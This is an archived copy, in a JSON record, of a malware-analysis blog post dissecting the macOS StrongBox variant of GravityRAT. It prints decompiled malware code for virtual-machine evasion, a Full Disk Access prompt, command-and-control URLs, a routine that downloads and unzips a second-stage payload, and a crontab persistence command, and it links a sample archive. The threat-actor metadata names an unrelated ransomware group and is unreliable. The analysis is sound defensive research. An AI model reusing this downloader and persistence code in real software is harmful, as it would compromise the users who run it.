{
    "id": "7cb25c3f-b963-4584-8158-5dd88dc32ca7",
    "created_at": "2023-01-12T15:02:53.164698Z",
    "updated_at": "2025-03-27T02:16:25.95334Z",
    "deleted_at": null,
    "sha1_hash": "881b5e053b69b83aacacd299cd158029ac30aba8",
    "title": "2020-11-27 - Adventures in Anti-Gravity (Part II) Deconstructing the Mac Variant of GravityRAT",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:35Z",
    "file_modification_date": "2022-05-29T01:23:35Z",
    "file_size": 2531029,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x5C.html**\n\nAdventures in Anti-Gravity (Part II)\n\nDeconstructing the Mac Variant of GravityRAT\n\nby: Patrick Wardle / November 27, 2020\n\nLove these blog posts and/or want to support my research and tools? You can support them\nvia my [Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\nüìù üëæ Want to play along?\n[I‚Äôve added the samples (GravityRat) to our malware collection (password: infect3d)](https://objective-see.com/downloads/malware/GravityRAT.zip)\n\n‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\nIn [part one, we detailed the (new) macOS variant of GravityRat. Of the various (macOS)](https://objective-see.com/blog/blog_0x5B.html)\nsamples, we focused first on a binary named `Enigma :`\n\n\"A brief triage revealed that while the `Enigma file appeared unique, the other three`\n_( OrangeVault,_ `StrongBox, and` `TeraSpace ) appeared quite similar. As such, we'll`\n_first dive into the_ `Enigma binary.\"`\n\nIn this post, we continue our analysis, but now focus on the `StrongBox binary, from the`\nother group of files.\n\n## StrongBox\n\n\n-----\n\nThe `StrongBox file ( SHA1: e33894042f3798516967471d0ce1e92d10dec756 ) is an`\nunsigned Mach-O binary:\n```\n$ file GravityRAT/StrongBox \nGravityRAT/StrongBox: Mach-O 64-bit executable x86_64\n$ codesign -dvvv GravityRAT/StrongBox \nGravityRAT/StrongBox: code object is not signed at all\n\n```\nBy extracting embedded strings, we can see the `StrongBox was packaged up with`\n```\nPyInstaller (as was the Enigma binary):\n$ strings - GravityRAT/StrongBox | grep Python\nPy_SetPythonHome\nError loading Python lib '%s': dlopen: %s\nError detected starting Python VM.\nPython\n\n```\nLeveraging a tool such as `PyInstaller allows developers (or malware authors) to write`\ncross-platform python code, then generate native, platform-specific binaries:\n\n‚ÄúPyInstaller freezes (packages) Python applications into stand-alone executables, under\n_Windows, GNU/Linux, Mac OS X, FreeBSD, Solaris and AIX.‚Äù_\n\nTo learn more about PyInstaller, head over to:\n\n[PyInstaller.org.](https://www.pyinstaller.org/)\nAs `StrongBox was packaged up with` `PyInstaller we can use the pyinstxtractor utility to`\nextact (unpackage) it‚Äôs contents:\n```\n$ python pyinstxtractor.py StrongBox \n[+] Processing GravityRAT/StrongBox\n[+] Pyinstaller version: 2.1+\n[+] Python version: 37\n[+] Length of package: 68331218 bytes\n[+] Found 50 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: strong.pyc\n...\n[+] Successfully extracted pyinstaller archive: StrongBox\nYou can now use a python decompiler on the pyc files within the extracted directory\n\n```\nPoking around in the extracted files, reveals a compressed file, named `app in the` `Extras`\ndirectory:\n\n\n-----\n\nExtras/app\nDecompressing (unzipping) the `app file, reveals an application named` `StrongBox.app ‚Ä¶`\nwhich (unsurprisingly) is also unsigned:\n\nStrongBox.app, unsigned\nUsually when triaging an application, I manually poke around via the terminal. However, a\n[new (free!) app named Apparency (from the developers of](https://www.mothersruin.com/software/Apparency/use.html) [Suspicious Package), offers a](https://www.mothersruin.com/software/SuspiciousPackage/)\nway to statically explore applications via the UI:\n\n\n-----\n\nStrongBox.app, in Apparency\n‚Ä¶including information about the application‚Äôs main executable,\n```\nStrongBox.app/Contents/MacOS/StrongBox :\n\n```\n\n-----\n\nStrongBox.app/Contents/MacOS/StrongBox\nOf note in the [Apparency output are](https://www.mothersruin.com/software/Apparency/use.html) `StrongBox.app's ‚ÄúDynamically Linked Libraries‚Äù ‚Ä¶`\nmost notably the `Electron Framework .`\n\nElecton is, ‚Äúa framework for creating native applications with web technologies like\n_JavaScript, HTML, and CSS.‚Äù_\n\nTo learn more about Electon, head over to:\n\n[ElectronJS.org.](https://www.electronjs.org/)\nThis presence of the Electron framework is unsurprising, as (recall) Kaspersky‚Äôs [report](https://securelist.com/gravityrat-the-spy-returns/99097/)\nnoted:\n\n\"The ...versions are multiplatform for Windows and Mac based on the Electron\n_framework.\"_\n\nFrom a reversing point of view, this is good news. Why? Electron applications are rather\ntrivial to analyze, as they (always?) ship with their original (JavaScript) source code.\nHowever this code may be archived and thus, must first be unpacked.\n\n\n-----\n\nIf an Electron application is packed, the archive format is `asar . From the` `asar` github\nrepo:\n\n\"Asar is a simple extensive archive format, it works like tar that concatenates all files\n_together without compression, while having random access support.\"_\n\n[As noted in a StackOver post titled, ‚ÄúHow to unpack an .asar file?‚Äù one can unpack an](https://stackoverflow.com/questions/38523617/how-to-unpack-an-asar-file) `asar`\narchive via the following: `npx asar extract app.asar destfolder .`\n\nIn the `StrongBox.app we find an` `asar archive ( app.asar ) in` `Contents/Resources/`\nand extract it in the following manner:\n```\n$ npx asar extract StrongBox.app/Contents/Resources/app.asar APP_ASAR\n\n```\nThe extracted archive contains various files, most notably several JavaScript files:\n\nUn-asar'd files\n\nAnd what do these file do? Welk, in Kaspersky‚Äôs [report they noted that each of the Electron](https://securelist.com/gravityrat-the-spy-returns/99097/)\nversions of the malware:\n\n\"checks if it is running on a virtual machine, collects information about the computer,\n_downloads the payload from the server, and adds a scheduled task.\"_\n\n\n-----\n\nLet s analyze the unarchived JavaScript files `main.js and` `signature.js, highlighting`\nthe code responsible for these actions.\n\nBoth JavaScript files are cross-platform (designed to run on both Windows and macOS).\nLogic specific to macOS is executed within ‚Äúis darwin‚Äù code blocks:\n\nvar osvar = process.platform;\nif( osvar.trim()== ‚Äúdarwin‚Äù ) {\n\n//macOS specific logic\n\n}\n\nThe `main.js contains logic, mostly related to various checks including:`\n\ncheck if running in a VM\ncheck if not connected to the Internet\ncheck if not running with Full Disk Access (FDA)\n\nLet‚Äôs take a closer look at each of these.\n\nThe aptly named function, `VMCheck, checks if the application is running within a Virtual`\nMachine. Virtual machine checks are commonly found in malware, in an attempt to ascertain\nif a malware analyst is (likely) examining the code (in a virtual machine).\n\n\n-----\n\n```\n 1function VMCheck(stdout) {\n 2\n 3 if (stdout.includes(\"innotek GmbH\") || \n 4   stdout.includes(\"VirtualBox\") || \n 5   stdout.includes(\"VMware\") || \n 6   stdout.includes(\"Microsoft Corporation\" || \n 7   stdout.includes(\"HITACHI\"))) {\n 8\n 9   axios.post(srdr, {\n10    value: 'vm',\n11    status: true\n12 })\n13\n14 ...\n15\n16 const options = {\n17  type: 'question',\n18  buttons: ['Ok'],\n19  defaultId: 2,\n20  title: 'StrongBOX - Operation Not Permitted in VirtualBOX',\n21  message: 'Action Required',\n22  detail: 'StrongBOX - Unable to load components\\n\n23       Please exit virtual mode to launch the application.'\n24 };\n25\n26 dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n27  app.quit();\n28  app.exit();\n29 });\n\n```\n‚Ä¶pretty easy to see its checking if the passed in parameter ( stdout ) contains strings\nrelated to popular virtual machine products (e.g. `VMware ). So what‚Äôs in the` `stdout`\nparameter? Well, if the malware is running on a macOS system, the `VMCheck function will`\nbe invoked from within a function named `Vmm :`\n```\n1function Vmm() {\n2  var modname = exec(\"system_profiler SPHardwareDataType | grep 'Model Name'\");\n3  var smc = exec(\"system_profiler SPHardwareDataType | grep 'SMC'\");\n4  var modid = exec(\"system_profiler SPHardwareDataType | grep 'Model\nIdentifier'\");\n5  var rom = exec(\"system_profiler SPHardwareDataType | grep 'ROM'\");\n6  var snum = exec(\"system_profiler SPHardwareDataType | grep 'Serial Number'\");\n7  VMCheck(modname + smc + modid + rom + snum);\n8}\n\n```\nThe `Vmm function gets the system identifying information such as the model name, model`\nidentifier, serial number and more. If executed within a virtual machine, this information will\ncontain VM-related strings:\n\n\n-----\n\n```\n$ system_profiler SPHardwareDataType | grep Model Identifier \n Model Identifier: VMware7,1\n$ system_profiler SPHardwareDataType | grep 'ROM'\n   Boot ROM Version: VMW71.00V.16221537.B64.2005150253\n   Apple ROM Info: [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]\n   Welcome to the Virtual Machine\n\n```\n‚Ä¶thus the malware will be able to detect it‚Äôs running within a virtual machine ‚Ä¶and display\nan error message\n```\n 1function VMCheck(stdout) {\n 2\n 3 ...\n 4\n 5 const options = {\n 6   type: 'question',\n 7   buttons: ['Ok'],\n 8   defaultId: 2,\n 9   title: 'StrongBOX - Operation Not Permitted',\n10   message: 'Oops!! Something went wrong. ',\n11   detail: 'Please check your internet connection and try again.'\n12  };\n13\n14  dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n15   app.quit();\n16   app.exit();\n17  });\n18 });\n\n```\nHowever, it appears that perhaps there is bug in the malware‚Äôs code, and an incorrect error\nmessage will be displayed ‚Ä¶ ‚ÄúPlease check your internet connection and try again.‚Äù:\n\n(incorrect) Error Message\nThe `main.js file also contains logic for a simple ‚Äúis connected‚Äù check. Often malware`\nperforms such checks to ensure it can communicate with a remote command and control\nserver, and/or to detect if it is perhaps executing on an offline analysis system.\n\n\n-----\n\nTo ascertain if it s running on an Internet connection system, the malware invokes a function\nnamed `connection which simply attempts to ping` `www.google.com :`\n```\n 1function connection(){ \n 2  execRoot('ping -t 4 www.google.com', function(error, stdout, stderr){\n 3    if(error || error !== null){\n 4        const options = {\n 5      type: 'question',\n 6      buttons: ['Ok'],\n 7      defaultId: 2,\n 8      title: 'Internet Connectivity Required',\n 9      message: 'Action Required',\n10      detail: \"Sorry! Please check your internet connectivity and try again.\"\n11     };\n12   \n13     dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n14      app.quit();\n15      app.exit();\n16     });\n17    \n18  } });\n19}\n\n```\nVia our [Process Monitor, we can observe this execution of the](https://objective-see.com/products/utilities.html#ProcessMonitor) `ping command:`\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"ping\",\n   \"-t\",\n   \"4\",\n   \"www.google.com\"\n  ],\n  \"ppid\" : 1447,\n  \"ancestors\" : [\n   1447,\n   1\n  ],\n  \"path\" : \"/sbin/ping\",\n  ...\n }\n}\n\n```\nLastly the `main.js function checks if the malware has been granted Full Disk Access`\n(FDA).\n\n\n-----\n\nOn recent versions of macOS, applications are prevented from accessing various\nuser/system files, unless the user has manually granted the application ‚ÄúFull Disk Access‚Äù\n(via the System Preferences application).\n\nAs such, malware that desires indiscriminate file system access may attempt to coerce users\ninto granting such access.\n\nIn order to check if has Full Disk Access, `GravityRat attempts to list the files in the`\n```\n~/Library/Safari . As this directory is inaccessible to applications without FDA, this is\n\n```\nsufficient check. If the malware determines it does not have FDA, it will prompt to the user to\ngrant such access:\n```\n 1var ressslt = execRoot('ls ~/Library/Safari', function(err, data, stderr){\n 2\n 3 if(!data || data ==\"\")\n 4 {\n 5  const options = {\n 6      type: 'question',\n 7      buttons: ['Ok'],\n 8      defaultId: 2,\n 9      title: 'StrongBox - Operation Not Permitted',\n10      message: 'Action Required',\n11      detail: \"Please follow the instructions to resolve this issue\n12           System Preferences -> Security & Privacy -> \n13              Full Disk Access to Terminal.app\"\n14     };\n15\n16     dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n17      app.quit();\n18      app.exit();\n19     });\n20     \n21 } });\n22}\n\n```\nWhile the `main.js file contains logic related to environmental checks (i.e. VM & FDA`\nchecks), the core of the malicious logic appears in the `signature.js file. As such, let‚Äôs`\nnow we dive into the `signature.js file.`\n\nAt the start of the `signature.js file we find various variables being initialized:`\n```\n1var srur = 'https://download.strongbox.in/strongbox/';\n2var srdr = 'https://download.strongbox.in/A0B74607.php';\n3var loclpth = path.join(app1.getPath('appData'), '/SCloud');\n\n```\nThese variable appear to the malware‚Äôs command and control server and a directory path,\nfound within the user application data directory (that we‚Äôll see is used for persistence).\n\nThe malware‚Äôs server, download.strongbox.in, appears to be now offline:\n\n$ nslookup download strongbox in Server: 8 8 8 8 Address: 8 8 8 8#53\n\n\n-----\n\nserver can t find download.strongbox.in: SERVFAIL\n\nThe code snippet, getPath(‚ÄòappData‚Äô), will return the ‚ÄúPer-user application data directory‚Äù,\nwhich on macOS points to ~/Library/Application Support.\n\nIf needed, the malware then will create the directory specified in the `loclpth variable`\n( ~/Library/Application Support/SCloud ):\n```\n1if (!fs.existsSync(loclpth)){\n2  fs.mkdirSync(loclpth,0700);\n\n```\nFurther down in the `signature.js file, we can see the malware invoking a function named`\n```\nupdates via the setInterval API:\n1setInterval(updates,180000) \n\n```\nAs its name implies, the `updates will download a file (and ‚Äúupdate‚Äù) from the server`\nspecified in the `srdr variable ( https://download.strongbox.in/A0B74607.php ):`\n```\n 1function updates()\n 2{\n 3 const insst = axios.create();\n 4 var hash = store.get('Hash')\n 5 axios.post(srdr, {\n 6    value: 'update',\n 7    hash: hash\n 8    })\n 9 .then((response) => {\n10    var respns = response.data;\n11    if(respns){\n12    var rply = respns.split('#');\n13    var fname = rply[0].trim();\n14    var agentTask = rply[1];\n15 }\n16    \n17 ...\n18\n19 var dpath;\n20 if(osvar.trim()==\"darwin\")\n21 var file = fs.createWriteStream(dpath);\n22 var request = https.get(srur+'Updates/' + fname, function(response) {\n23 response.pipe(file);\n24 file.on('finish', function() {\n25  getDateTime();\n26  extractzip1(fname,agentTask);\n27  file.close();\n28 });\n29\n30 ...\n31}\n\n```\n\n-----\n\nIf this remote server ( https://download.strongbox.in/A0B74607.php ), provides a\npayload for download, the malware will then invoke the `extractzip1 function:`\n```\n 1function extractzip1(fname,agentTask)\n 2{\n 3 \n 4 var source;\n 5 var sourceTozip;\n 6 if(osvar.trim()==\"darwin\") {\n 7   source = loclpth+\"/\"+fname;\n 8   sourceTozip = source+\".zip\";\n 9 }\n10  \n11 ...\n12 fs.rename(source, sourceTozip, function(err) {\n13 \n14 });\n15\n16 \n17 if(osvar.trim()==\"darwin\") {\n18  var extract = require('extract-zip')\n19  var target= loclpth;\n20  extract(sourceTozip, {dir: target}, function (err) {\n21   \n22   ...\n23   scheduleMac(fname,agentTask);\n24   }\n25  });\n26 }\n27}\n\n```\nAfter appending `.zip, the malware extracts the downloaded (zip) file to the location`\nspecified in the `loclpth variable ( ~/Library/Application Support/SCloud ). Once`\nextracted it invokes a function named `scheduleMac to persist and launch the downloaded`\npayload.\n\nThe `scheduleMac persists the downloaded payload as cronjob, via the builtin` `crontab`\ncommand:\n```\n 1function scheduleMac(fname,agentTask)\n 2{\n 3 ...                             \n 4 var poshellMac = loclpth+\"/\"+fname;\n 5 execTask('chmod -R 0700 ' + \"\\\"\" + + \"\\\"\" );                 \n 6 \n 7 ...\n 8 arg = agentTask;\n 9 execTask('crontab -l 2>/dev/null; \n10      echo \\' */2 * * * * ' + \"\\\"\" +poshellMac + \"\\\" \" + arg + '\\' \n11      | crontab -', puts22);\n12  \n13}\n\n```\n\n-----\n\n‚Ä¶the persisted payload, will be (re)launched every two minutes ( `/2` ).\n\nUnfortunately as the remote server ( download.strongbox.in ) is now offline, this 2nd stage\npayload is not available for analysis.\n\n\n## Conclusions\n\nIn this blog post, we wrapped up our analysis of the macOS variant of `GravityRat .`\nSpecifically we deconstructed the Electron versions (focusing on `StrongBox.app ), and`\nhighlighted their role as downloaders of 2nd-stage payload(s) ‚Ä¶payloads persisted as\ncronjobs.\n\n[And although we do not have access to such payload(s), BlockBlock will readily detect their](https://objective-see.com/products/blockblock.html)\n(cronjob) persistence at runtime:\n\nBlockBlock ...block, blocking!\n[‚Ä¶while KnockKnock can reveal any existing infections:](https://objective-see.com/products/knockknock.html)\n\n\n-----\n\nKnockKnock ...who's there?\nFrom a terminal, one can use the crontab command (with the -l parameter) to enumerate any\ncronjobs ...including those related to GravitRat's persistence.\n\n## üìö The Art of Mac Malware\n\nIf this blog posts pique your interest, definitely check out my new book on the topic of Mac\n[Malware Analysis: ‚ÄúThe Art Of Mac Malware: Analysis‚Äù. It‚Äôs free online, and new content is](https://taomm.org/)\nregularly added!\n\n## üíï Support Us:\n\n[Love these blog posts? You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\n\n-----\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-27 - Adventures in Anti-Gravity (Part II) Deconstructing the Mac Variant of GravityRAT.pdf"
    ],
    "report_names": [
        "2020-11-27 - Adventures in Anti-Gravity (Part II) Deconstructing the Mac Variant of GravityRAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535773,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653787415,
    "ts_modification_date": 1653787415,
    "files": {
        "pdf": "https://archive.orkl.eu/881b5e053b69b83aacacd299cd158029ac30aba8.pdf",
        "text": "https://archive.orkl.eu/881b5e053b69b83aacacd299cd158029ac30aba8.txt",
        "img": "https://archive.orkl.eu/881b5e053b69b83aacacd299cd158029ac30aba8.jpg"
    }
}